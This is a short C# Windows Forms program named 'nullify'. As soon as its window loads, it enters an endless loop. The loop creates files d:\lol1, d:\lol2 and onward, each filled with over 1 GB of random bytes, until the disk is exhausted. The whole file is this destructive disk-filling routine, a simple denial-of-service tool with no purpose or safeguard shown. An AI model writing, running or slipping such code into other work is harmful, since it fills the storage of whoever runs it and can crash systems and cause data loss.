using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace nullify
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Random rnd = new Random();
            long lim = 1;
            lim *= 1024;
            lim *= 1024;
            lim *= 1024;
            int iFNum = 0;
            while (true)
            {
                iFNum++;
                System.IO.FileStream fs = new System.IO.FileStream(
                    "d:\\lol" + iFNum, System.IO.FileMode.Create);

                while (true)
                {
                    byte[] b = new byte[1048576 * 256];
                    rnd.NextBytes(b);
                    fs.Write(b, 0, b.Length);
                    if (fs.Length > lim) break;
                }
                fs.Flush(); fs.Close(); fs.Dispose();
            }
        }
    }
}
